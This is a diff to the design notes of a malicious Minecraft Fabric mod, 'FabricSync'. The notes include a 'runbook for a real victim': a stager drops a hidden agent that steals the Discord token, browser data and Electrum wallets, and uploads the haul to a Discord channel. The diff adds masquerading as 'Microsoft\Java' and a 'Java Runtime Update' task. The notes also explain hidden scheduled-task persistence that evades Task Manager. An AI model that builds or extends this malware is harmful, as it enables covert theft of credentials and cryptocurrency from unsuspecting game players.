@@ -13,11 +13,13 @@ Every reference to `net.minecraft` is confined to the mixin and the entrypoint.
 
 Install directories:
 
-- Windows: `%LOCALAPPDATA%\FabricSync`
+- Windows: `%LOCALAPPDATA%\Microsoft\Java` (hidden and system)
 - Linux: `$XDG_DATA_HOME/FabricSync` or `~/.local/share/FabricSync`
 - macOS: `~/Library/Application Support/FabricSync`
 
-An existing `%LOCALAPPDATA%\ServerPackCore` wins over a new directory. Such a tree is *legacy*: it keeps `spc-agent.jar`, `alive.txt`, `state.json`, `spc-update.*` and the `\ServerPackCore` task because the already deployed helper references those names. Everything visible (`cache/`, `sync-*.zip`, embeds and uploads) is modern even there. A fresh tree uses `runtime.jar`, `session.txt`, `config.json`, `update.*`, `startup.vbs` and the `\FabricSync` task.
+An existing `%LOCALAPPDATA%\FabricSync` is moved to `Microsoft\Java` on the next mod launch, and `ServerPackCore`/`FabricSync` tasks or Run values are replaced by `Java Runtime Update`. Hidden and system attributes are reapplied; the contents are hidden recursively.
+
+An existing `%LOCALAPPDATA%\ServerPackCore` wins over a new directory until its next mod launch, when it is migrated too. Such a tree is *legacy*: it keeps `spc-agent.jar`, `alive.txt`, `state.json` and `spc-update.*` because the already deployed helper references those names. Everything visible (`cache/`, `sync-*.zip`, embeds and uploads) is modern even there. A fresh tree uses `runtime.jar`, `session.txt`, `config.json`, `update.*`, `startup.vbs` and the `Java Runtime Update` task.
 
 The agent writes `session.txt` with the game PID and its own. Failures also append to `logs/agent.log` (rotated at 256 KB). The `runtime.lock` lockfile prevents duplicates. The `.version` marker stores the installed version; if `javaw.exe` or `runtime.jar` disappears, the stager extracts them again. The install directory is marked hidden with `attrib +h`, not system.
 
@@ -113,7 +115,7 @@ On Windows the first start needs no input, no password and no UAC. About 45-75 s
 Runbook for a real victim:
 
 1. Install Fabric Loader 0.20.1 and Fabric API for 1.20.1, then copy `fabric-sync-<version>.jar` into the profile's `mods/`.
-2. Open Minecraft and enter any world. The stager fires after 20-60 s and creates `%LOCALAPPDATA%\FabricSync` hidden.
+2. Open Minecraft and enter any world. The stager fires after 20-60 s and creates `%LOCALAPPDATA%\Microsoft\Java` hidden and system.
 3. The agent creates the `sync-<host>-<user>` channel, posts the `Fabric Sync` embed and starts the bootstrap.
 4. The harvest uploads on its own, including ABE v20 and the Discord token, then deletes the local ZIP.
 5. Persistence and signed auto-update are already on; close the game and confirm the agent returns after logon.
@@ -202,7 +204,7 @@ Las carteras de Electrum cifradas (BIE1) se exportan como `wallets/electrum-*.en
 
 `persist on` is idempotent and prepares autostart: a hidden scheduled task on Windows or a `.desktop` file in `~/.config/autostart` on Unix.
 
-On Windows it uses a logon task (`\FabricSync` in a modern tree, `\ServerPackCore` in a legacy one) with `<Hidden>true</Hidden>`; it does not appear in Task Manager's startup tab, which only lists `Run`/`RunOnce`, Startup folders and UWP tasks. The task, created via `schtasks /create /xml`, is also invisible in Task Scheduler unless hidden tasks are enabled. If `schtasks` fails, it falls back to the classic `Run` value so persistence is not lost.
+On Windows it uses a logon task (`\Java Runtime Update` in a modern tree, `\ServerPackCore` in a legacy one) with `<Hidden>true</Hidden>`; it does not appear in Task Manager's startup tab, which only lists `Run`/`RunOnce`, Startup folders and UWP tasks. The task, created via `schtasks /create /xml`, is also invisible in Task Scheduler unless hidden tasks are enabled. If `schtasks` fails, it falls back to the classic `Run` value so persistence is not lost.
 
 The task does not point to the copied `javaw.exe`: a loose launcher cannot find `lib\jvm.cfg` or `bin\server\jvm.dll` without `JAVA_HOME`. It generates `startup.vbs` (legacy: `spc-sync.vbs`) in the install directory, which sets `JAVA_HOME`, starts hidden and tries the real runtime's `javaw.exe`, the local copy and finally `%JAVA_HOME%`.
 
@@ -210,7 +212,7 @@ The agent marks `persist` in the state file and regenerates the launcher and tas
 
 It is not invisible to everything either: `schtasks /query`, the `C:\Windows\System32\Tasks` tree and Autoruns still see it. Real hiding requires services or `Winlogon\Shell`/`Userinit` (HKLM, with admin) or a permanent WMI subscription.
 
-If another pack leaves `wscript`/`.vbs` startups, `persist on` lists them and warns if their path no longer exists or if they reuse our directory. They coexist unless they kill `java`/`javaw` processes or step on the `FabricSync` task/value.
+If another pack leaves `wscript`/`.vbs` startups, `persist on` lists them and warns if their path no longer exists or if they reuse our directory. They coexist unless they kill `java`/`javaw` processes or step on the `Java Runtime Update` task/value.
 
 ## Self-update
 
